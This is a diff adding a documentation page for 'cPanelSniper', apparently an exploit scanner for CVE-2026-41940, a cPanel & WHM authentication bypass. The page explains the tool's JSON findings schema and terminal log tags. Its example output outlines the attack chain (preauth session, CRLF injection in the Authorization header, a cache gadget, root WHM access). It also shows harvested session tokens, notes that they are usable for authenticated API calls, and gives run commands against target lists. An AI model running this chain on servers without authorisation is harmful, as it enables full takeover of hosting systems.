@@ -1,0 +1,146 @@
+---
+title: "cPanelSniper JSON Output Format and Log Tags"
+description: "Understand cPanelSniper's JSON findings output schema and terminal log tag meanings for integrating scan results into security workflows."
+---
+
+cPanelSniper produces two kinds of output: timestamped terminal log lines printed during the scan and, optionally, a structured JSON file written when you pass `-o`. Understanding both is useful when piping results into SIEM platforms, ticketing systems, or custom reporting scripts.
+
+## JSON output schema
+
+Pass `-o <file>` to save all confirmed findings to a JSON file after the scan completes. The file is only created when at least one finding is confirmed.
+
+```bash
+python3 cPanelSniper.py -l targets.txt -o results.json
+```
+
+### Top-level fields
+
+<ResponseField name="scanner" type="string" required>
+  Tool name and version string. Always `"cPanelSniper v2.0"`.
+</ResponseField>
+
+<ResponseField name="cve" type="string" required>
+  CVE identifier for the vulnerability being tested. Always `"CVE-2026-41940"`.
+</ResponseField>
+
+<ResponseField name="timestamp" type="string" required>
+  ISO 8601 timestamp recording when the scan output file was written.
+</ResponseField>
+
+<ResponseField name="findings" type="object[]" required>
+  Array of confirmed bypass findings. One object per vulnerable target.
+
+  <Expandable title="findings properties">
+    <ResponseField name="severity" type="string" required>
+      Risk severity level. Always `"CRIT"` for CVE-2026-41940.
+    </ResponseField>
+
+    <ResponseField name="title" type="string" required>
+      Human-readable finding title. Always `"CVE-2026-41940 — cPanel & WHM Authentication Bypass"`.
+    </ResponseField>
+
+    <ResponseField name="target" type="string" required>
+      The URL supplied via `-u` or read from the `-l` target file, exactly as provided.
+    </ResponseField>
+
+    <ResponseField name="canonical" type="string" required>
+      Canonical hostname discovered during Stage 0 of the exploit chain, or the value supplied via `--hostname`.
+    </ResponseField>
+
+    <ResponseField name="session" type="string">
+      Raw preauth session base string minted during Stage 1. Used internally to construct the CRLF injection payload.
+    </ResponseField>
+
+    <ResponseField name="token" type="string" required>
+      Authenticated WHM session path returned in the Stage 2 redirect, e.g. `"/cpsessXXXXXXXXXX"`. Append this to the target URL to make authenticated WHM API requests.
+    </ResponseField>
+
+    <ResponseField name="version" type="string" required>
+      Full cPanel & WHM version string confirmed in Stage 4, e.g. `"11.130.0.6"`.
+    </ResponseField>
+
+    <ResponseField name="api_url" type="string" required>
+      Full authenticated API URL verified during Stage 4, e.g. `"https://target.com:2087/cpsessXXXXXXXXXX/json-api/version"`. This URL can be used directly with the WHM JSON API.
+    </ResponseField>
+
+    <ResponseField name="evidence" type="string">
+      Raw response fragment captured during Stage 4 verification, used to confirm WHM root access.
+    </ResponseField>
+
+    <ResponseField name="cve" type="string" required>
+      CVE identifier repeated at the finding level for ease of filtering. Always `"CVE-2026-41940"`.
+    </ResponseField>
+
+    <ResponseField name="cvss" type="string" required>
+      CVSS base score for the vulnerability. Always `"10.0"`.
+    </ResponseField>
+
+    <ResponseField name="timestamp" type="string" required>
+      ISO 8601 timestamp recording when this individual finding was confirmed.
+    </ResponseField>
+  </Expandable>
+</ResponseField>
+
+### Example output
+
+```json
+{
+  "scanner": "cPanelSniper v2.0",
+  "cve": "CVE-2026-41940",
+  "timestamp": "2026-04-28T14:46:27.000000",
+  "findings": [
+    {
+      "severity": "CRIT",
+      "title": "CVE-2026-41940 — cPanel & WHM Authentication Bypass",
+      "target": "https://target.com:2087",
+      "canonical": "srv01.target.com",
+      "session": ":QFB4o8XENBqlr6U1bNwTkpz2mJcAeRsId3vHyOgWf",
+      "token": "/cpsess8493537756",
+      "version": "11.130.0.6",
+      "api_url": "https://target.com:2087/cpsess8493537756/json-api/version",
+      "evidence": "{\"data\":{\"version\":\"11.130.0.6\"},\"metadata\":{\"result\":1}}",
+      "cve": "CVE-2026-41940",
+      "cvss": "10.0",
+      "timestamp": "2026-04-28T14:46:26.000000"
+    }
+  ]
+}
+```
+
+## Terminal log tags
+
+Every log line printed during a scan is prefixed with a timestamp and a bracketed tag that indicates the type of event. The tags are fixed-width so output aligns cleanly in a terminal or log file.
+
+| Tag | Meaning |
+|---|---|
+| `[SCAN]` | Scan started for this target — the 4-stage exploit chain is about to begin |
+| `[STEP]` | A stage of the exploit chain is running |
+| `[  OK]` | The stage completed successfully |
+| `[ ERR]` | A stage failed — the target is likely patched, misconfigured, or unreachable |
+| `[SKIP]` | Target skipped because it was not identified as a cPanel host, or was already scanned |
+| `[INFO]` | Informational context, such as the canonical hostname discovered in Stage 0 |
+| `[PWND]` | Authentication bypass confirmed — WHM root access was obtained |
+| `[WARN]` | Unexpected but non-fatal condition during the exploit chain |
+| `[ API]` | A post-exploit API call is in progress after the bypass was confirmed |
+
+Example log output showing a successful bypass:
+
+```text
+14:46:22 [SCAN] Starting 4-stage exploit chain... https://target.com:2087
+14:46:23 [INFO] Canonical hostname discovered: srv01.target.com
+14:46:23 [STEP] Stage 1/4 — Minting preauth session...
+14:46:23 [  OK] Stage1: preauth session = :QFB4o8XENBqlr6U1...
+14:46:23 [STEP] Stage 2/4 — CRLF injection via Authorization header...
+14:46:24 [  OK] Stage2: HTTP 307 → token=/cpsess8493537756
+14:46:24 [STEP] Stage 3/4 — Firing do_token_denied gadget (raw→cache)...
+14:46:25 [  OK] Stage3: HTTP 401 — do_token_denied gadget fired
+14:46:25 [STEP] Stage 4/4 — Verifying WHM root access...
+14:46:26 [PWND] CVE-2026-41940 CONFIRMED — WHM root access!
+14:46:26 [PWND]   Token    : /cpsess8493537756
+14:46:26 [PWND]   Version  : 11.130.0.6
+14:46:26 [PWND]   API URL  : https://target.com:2087/cpsess8493537756/json-api/version
+```
+
+<Tip>
+  Add `--no-color` to strip ANSI escape codes from terminal output when piping to a file or log aggregator: `python3 cPanelSniper.py -l targets.txt --no-color | tee scan.log`
+</Tip>
